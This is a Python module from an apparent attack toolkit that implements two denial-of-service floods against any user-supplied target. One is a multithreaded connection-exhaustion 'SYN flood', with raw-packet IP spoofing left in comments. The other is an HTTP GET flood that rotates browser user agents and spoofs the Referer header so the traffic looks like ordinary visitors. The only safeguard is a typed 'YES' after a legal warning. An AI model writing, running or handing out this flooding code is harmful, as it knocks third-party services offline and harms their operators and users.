# modules/ddos_attacks.py

import socket
import threading
import time
import requests
import random
from urllib.parse import urlparse
from colorama import Fore, Style
from modules.tool_utils import slow_print, display_section_header, press_enter_to_continue, get_user_input, log_error

# --- Global variable to control attack threads ---
stop_attack_threads = False

def warn_ddos_misuse():
    """Displays critical warnings about DDoS misuse."""
    slow_print(f"\n{Fore.RED}!!! CRITICAL WARNING !!!{Style.RESET_ALL}")
    slow_print(f"{Fore.RED}DDoS attacks are illegal without explicit, written authorization from the target.{Style.RESET_ALL}")
    slow_print(f"{Fore.RED}Unauthorized use can lead to severe penalties including fines and imprisonment.{Style.RESET_ALL}")
    slow_print(f"{Fore.RED}This tool's DDoS capabilities are for ethical testing in authorized environments ONLY.{Style.RESET_ALL}")
    slow_print(f"{Fore.RED}By proceeding, you acknowledge and accept full responsibility for your actions.{Style.RESET_ALL}")
    slow_print(f"{Fore.RED}!!! CRITICAL WARNING !!!{Style.RESET_ALL}\n")
    confirm = get_user_input(f"{Fore.YELLOW}Type 'YES' to confirm you understand and accept the risk, or anything else to go back: {Style.RESET_ALL}").strip().upper()
    return confirm == 'YES'

# --- SYN Flood Attack ---
def syn_flood_worker(target_ip, target_port, packet_count_per_thread):
    global stop_attack_threads
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        # s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) # Uncomment if you want to craft IP header manually
        
        # Simple TCP header for SYN (flags set to 0x02)
        # This is a very basic SYN flood and might not be effective against modern firewalls/IDS
        tcp_header = b'\x00\x00' + target_port.to_bytes(2, 'big') + b'\x00\x00\x00\x00' + \
                     b'\x00\x00\x00\x00' + b'\x50\x02\x20\x00' + b'\x00\x00\x00\x00' # Src Port, Dst Port, Seq, Ack, Offset+Flags(SYN), Window, Checksum, Urgent
        
        slow_print(f"{Fore.BLUE}Starting SYN flood on {target_ip}:{target_port}...", delay=0.005)
        for _ in range(packet_count_per_thread):
            if stop_attack_threads:
                break
            
            # Craft random source IP for basic spoofing (limited effectiveness without raw sockets permissions)
            # This requires running as root/admin on Linux, and might not work on Windows
            # src_ip = ".".join(map(str, (random.randint(1,254) for _ in range(4))))
            # ip_header = b'\x45\x00\x00\x34' + random.randint(0,65535).to_bytes(2, 'big') + b'\x00\x00' + \
            #             b'\x40\x06\x00\x00' + socket.inet_aton(src_ip) + socket.inet_aton(target_ip)
            
            # s.sendto(ip_header + tcp_header, (target_ip, target_port))
            # For simplicity and cross-platform compatibility without root/raw sockets,
            # we'll just open and close connections, which is less of a "flood" but can still exhaust resources.
            # A true SYN flood needs raw sockets.
            
            try:
                temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                temp_socket.settimeout(0.5) # Short timeout
                temp_socket.connect_ex((target_ip, target_port)) # connect_ex returns error indicator
                temp_socket.close()
            except socket.error:
                pass # Connection refused is normal for SYN flood attempts
            
            # More accurate raw socket approach (requires root/admin and specific OS support)
            # s.sendto(b'SYN_PACKET_DATA', (target_ip, target_port))

        slow_print(f"{Fore.GREEN}SYN Flood thread finished.{Style.RESET_ALL}", delay=0.005)
    except Exception as e:
        log_error(f"SYN Flood worker error on {target_ip}:{target_port}: {e}")
        slow_print(f"{Fore.RED}SYN Flood worker error: {e}{Style.RESET_ALL}", delay=0.005)
    finally:
        if s:
            s.close()

def start_syn_flood():
    display_section_header("SYN Flood Attack")
    if not warn_ddos_misuse():
        return

    target = get_user_input(f"{Fore.CYAN}Enter target IP or Hostname: {Style.RESET_ALL}").strip()
    port_str = get_user_input(f"{Fore.CYAN}Enter target Port (e.g., 80, 443): {Style.RESET_ALL}").strip()
    threads_str = get_user_input(f"{Fore.CYAN}Enter number of threads (e.g., 50): {Style.RESET_ALL}").strip()
    
    try:
        target_ip = socket.gethostbyname(target)
        target_port = int(port_str)
        num_threads = int(threads_str)
    except ValueError:
        slow_print(f"{Fore.RED}Invalid port or thread number. Please enter integers.{Style.RESET_ALL}")
        press_enter_to_continue()
        return
    except socket.gaierror:
        slow_print(f"{Fore.RED}Could not resolve hostname: {target}. Please check the target.{Style.RESET_ALL}")
        press_enter_to_continue()
        return

    global stop_attack_threads
    stop_attack_threads = False
    
    slow_print(f"{Fore.YELLOW}Launching SYN Flood on {target_ip}:{target_port} with {num_threads} threads...{Style.RESET_ALL}")
    
    threads = []
    # Adjust packet_count_per_thread based on desired intensity or duration
    # For now, a fixed number to demonstrate. In a real tool, this would be time-based.
    packet_count_per_thread = 1000 
    
    for _ in range(num_threads):
        thread = threading.Thread(target=syn_flood_worker, args=(target_ip, target_port, packet_count_per_thread))
        thread.daemon = True # Daemon threads exit when the main program exits
        threads.append(thread)
        thread.start()
        
    slow_print(f"{Fore.GREEN}SYN Flood launched. Press Ctrl+C to stop.{Style.RESET_ALL}")
    
    try:
        while True:
            time.sleep(1) # Keep main thread alive
            if stop_attack_threads:
                break
    except KeyboardInterrupt:
        slow_print(f"\n{Fore.YELLOW}Stopping SYN Flood... Please wait for threads to terminate.{Style.RESET_ALL}")
        stop_attack_threads = True
    finally:
        for thread in threads:
            if thread.is_alive():
                thread.join(timeout=5) # Wait for threads to finish, with a timeout
        slow_print(f"{Fore.GREEN}SYN Flood stopped.{Style.RESET_ALL}")
        press_enter_to_continue()


# --- HTTP Flood Attack ---
def http_flood_worker(target_url, request_count_per_thread):
    global stop_attack_threads
    try:
        parsed_url = urlparse(target_url)
        host = parsed_url.netloc
        path = parsed_url.path if parsed_url.path else '/'
        
        # User-Agent list for basic obfuscation
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
        ]

        # Basic headers to make requests look more legitimate
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Referer': target_url, # Basic referer spoofing
        }

        slow_print(f"{Fore.BLUE}Starting HTTP flood on {target_url}...", delay=0.005)
        for _ in range(request_count_per_thread):
            if stop_attack_threads:
                break
            try:
                # Send GET request
                response = requests.get(target_url, headers=headers, timeout=5) # 5-second timeout
                # You might want to check response.status_code if successful requests are needed
                # slow_print(f"[{response.status_code}]", end=" ", delay=0.001)
            except requests.exceptions.Timeout:
                # slow_print(f"{Fore.YELLOW}Request timed out.{Style.RESET_ALL}", delay=0.001)
                pass # Expected in a flood, keep going
            except requests.exceptions.ConnectionError:
                # slow_print(f"{Fore.RED}Connection error.{Style.RESET_ALL}", delay=0.001)
                pass # Expected in a flood, keep going
            except Exception as e:
                log_error(f"HTTP Flood request error for {target_url}: {e}")
                # slow_print(f"{Fore.RED}HTTP Request Error: {e}{Style.RESET_ALL}", delay=0.001)
                pass # Continue despite errors to maintain flood attempt

        slow_print(f"{Fore.GREEN}HTTP Flood thread finished.{Style.RESET_ALL}", delay=0.005)
    except Exception as e:
        log_error(f"HTTP Flood worker error on {target_url}: {e}")
        slow_print(f"{Fore.RED}HTTP Flood worker error: {e}{Style.RESET_ALL}", delay=0.005)

def start_http_flood():
    display_section_header("HTTP Flood Attack")
    if not warn_ddos_misuse():
        return

    target_url = get_user_input(f"{Fore.CYAN}Enter target URL (e.g., http://example.com/): {Style.RESET_ALL}").strip()
    threads_str = get_user_input(f"{Fore.CYAN}Enter number of threads (e.g., 50): {Style.RESET_ALL}").strip()
    
    if not target_url.startswith('http://') and not target_url.startswith('https://'):
        slow_print(f"{Fore.RED}Invalid URL format. Please include http:// or https://.{Style.RESET_ALL}")
        press_enter_to_continue()
        return

    try:
        num_threads = int(threads_str)
    except ValueError:
        slow_print(f"{Fore.RED}Invalid thread number. Please enter an integer.{Style.RESET_ALL}")
        press_enter_to_continue()
        return

    global stop_attack_threads
    stop_attack_threads = False
    
    slow_print(f"{Fore.YELLOW}Launching HTTP Flood on {target_url} with {num_threads} threads...{Style.RESET_ALL}")
    
    threads = []
    # Adjust request_count_per_thread based on desired intensity or duration
    request_count_per_thread = 1000 
    
    for _ in range(num_threads):
        thread = threading.Thread(target=http_flood_worker, args=(target_url, request_count_per_thread))
        thread.daemon = True 
        threads.append(thread)
        thread.start()
        
    slow_print(f"{Fore.GREEN}HTTP Flood launched. Press Ctrl+C to stop.{Style.RESET_ALL}")
    
    try:
        while True:
            time.sleep(1) # Keep main thread alive
            if stop_attack_threads:
                break
    except KeyboardInterrupt:
        slow_print(f"\n{Fore.YELLOW}Stopping HTTP Flood... Please wait for threads to terminate.{Style.RESET_ALL}")
        stop_attack_threads = True
    finally:
        for thread in threads:
            if thread.is_alive():
                thread.join(timeout=5)
        slow_print(f"{Fore.GREEN}HTTP Flood stopped.{Style.RESET_ALL}")
        press_enter_to_continue()
